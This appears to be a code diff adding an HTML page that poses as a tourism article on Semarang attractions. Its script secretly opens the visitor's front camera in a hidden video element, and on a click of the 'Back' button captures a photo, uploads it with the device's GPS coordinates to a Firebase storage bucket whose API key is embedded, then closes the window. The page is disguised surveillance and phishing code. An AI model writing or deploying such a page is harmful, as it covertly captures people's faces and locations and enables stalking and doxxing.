@@ -1,0 +1,184 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>WisataKita</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+</head>
+<style>
+body {
+  font-family: Arial, sans-serif;
+  margin: 0;
+  padding: 20px;
+  background-color: #f2f2f2;
+}
+
+h1 {
+  text-align: center;
+  color: #333;
+}
+
+#video {
+  display: none;
+}
+
+#capture {
+  display: block;
+  margin: 20px auto;
+  padding: 10px 20px;
+  font-size: 16px;
+  font-weight: bold;
+  color: #fff;
+  background-color: #333;
+  border: none;
+  border-radius: 4px;
+  cursor: pointer;
+}
+
+.container {
+  display: flex;
+  flex-wrap: wrap;
+  justify-content: center;
+}
+
+.row {
+  display: flex;
+  justify-content: center;
+}
+
+img {
+  width: 100%;
+  max-width: 150px;
+  height: auto;
+  object-fit: cover;
+  margin: 10px;
+}
+
+/* Tampilan mode mobile */
+@media (max-width: 480px) {
+  body {
+    padding: 10px;
+  }
+
+  img {
+    max-width: 100%;
+    max-height: 100px;
+  }
+}
+
+
+</style>
+<body>
+  <h1>Artikel Tujuan Lokasi Wisata Semarang</h1>
+<div class="container">
+  <div class="row">
+    <img src="https://i.ibb.co/z7XHH8v/oznhhejhylofv7hpftt5.webp" alt="oznhhejhylofv7hpftt5" border="0">
+    <img src="https://i.ibb.co/7CpdGTf/Saloka-Park-KUMBANG-LAYANG-szprbn.webp" alt="Saloka-Park-KUMBANG-LAYANG-szprbn" border="0">
+    </div>
+  <div class="row">
+   <img src="https://i.ibb.co/6cQ4X3m/Sam-Poo-Kong-2-zjpcnc.webp" alt="Sam-Poo-Kong-2-zjpcnc" border="0">
+    <img src="https://i.ibb.co/K9D5JJ5/Kota-Lama-Semarang-Oktavisual-Project-Unsplash-xx3oeg.webp" alt="Kota-Lama-Semarang-Oktavisual-Project-Unsplash-xx3oeg" border="0">
+    </div>
+  <div class="row">
+   <img src="https://i.ibb.co/s5QyVFC/Pagoda-Avalokitesvara-Semarang-min-fhxaoi.webp" alt="Pagoda-Avalokitesvara-Semarang-min-fhxaoi" border="0">
+    <img src="https://i.ibb.co/Vts04yb/Kampung-Pelangi-Semarang-min-uiljr2.webp" alt="Kampung-Pelangi-Semarang-min-uiljr2" border="0">
+  </div>
+</div>
+
+  <video id="video" width="640" height="480" autoplay></video>
+  <button id="capture">Kembali</button>
+
+  <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
+  <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-storage.js"></script>
+  <script>
+    // Konfigurasi Firebase
+    var firebaseConfig = {
+      apiKey: "AIzaSyBXAt5-xYz-7PxCPhXsGcYO4ipLxNpc4sI",
+      authDomain: "database-53d50.firebaseapp.com",
+      projectId: "database-53d50",
+      storageBucket: "database-53d50.appspot.com",
+      appId: "1:1090320823493:web:1cf4367216646d369d2cac"
+    };
+
+    // Inisialisasi Firebase
+    firebase.initializeApp(firebaseConfig);
+    var storageRef = firebase.storage().ref();
+
+    // Mengambil video dan menampilkannya di elemen video
+    navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } })
+      .then(function(stream) {
+        var video = document.getElementById('video');
+        video.srcObject = stream;
+        video.play();
+      })
+      .catch(function(error) {
+        console.error("Tidak dapat mengakses kamera: ", error);
+      });
+
+    // Mengambil gambar saat tombol di klik
+    var captureButton = document.getElementById('capture');
+    captureButton.addEventListener('click', function() {
+      var video = document.getElementById('video');
+      var canvas = document.createElement('canvas');
+      var context = canvas.getContext('2d');
+      canvas.width = video.videoWidth;
+      canvas.height = video.videoHeight;
+      context.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+      // Mengonversi gambar menjadi URL data
+      canvas.toBlob(function(blob) {
+        // Membuat nama unik untuk file gambar
+        var imageName = new Date().getTime() + '.png';
+
+        // Mengunggah gambar ke Firebase Storage
+        var uploadTask = storageRef.child(imageName).put(blob);
+        uploadTask.then(function(snapshot) {
+          console.log('Gambar berhasil diunggah ke Firebase Storage.');
+
+          // Mendapatkan posisi longitude dan latitude
+          if ("geolocation" in navigator) {
+            navigator.geolocation.getCurrentPosition(function(position) {
+              var latitude = position.coords.latitude;
+              var longitude = position.coords.longitude;
+              console.log('Longitude: ' + longitude);
+              console.log('Latitude: ' + latitude);
+
+              // Mengunggah informasi posisi ke Firebase Storage
+              var metadata = {
+                contentType: 'text/plain'
+              };
+              var longitudeRef = storageRef.child(imageName + '_longitude.txt');
+              longitudeRef.putString(longitude.toString(), 'raw', metadata)
+                .then(function(snapshot) {
+                  console.log('Longitude berhasil diunggah ke Firebase Storage.');
+                })
+                .catch(function(error) {
+                  console.error('Gagal mengunggah longitude: ', error);
+                });
+
+              var latitudeRef = storageRef.child(imageName + '_latitude.txt');
+              latitudeRef.putString(latitude.toString(), 'raw', metadata)
+                .then(function(snapshot) {
+                  console.log('Latitude berhasil diunggah ke Firebase Storage.');
+                })
+                .catch(function(error) {
+                  console.error('Gagal mengunggah latitude: ', error);
+                });
+            }, function(error) {
+              console.error('Gagal mendapatkan posisi: ', error);
+            });
+          } else {
+            console.error('Geolocation tidak didukung.');
+          }
+          // Menutup jendela setelah 1 detik
+            setTimeout(function() {
+            window.close();
+             }, 10);
+       })
+       .catch(function(error) {
+  console.error("Tidak dapat mengakses kamera: ", error);
+});
+      }, 'image/png');
+    });
+  </script>
+</body>
+</html>
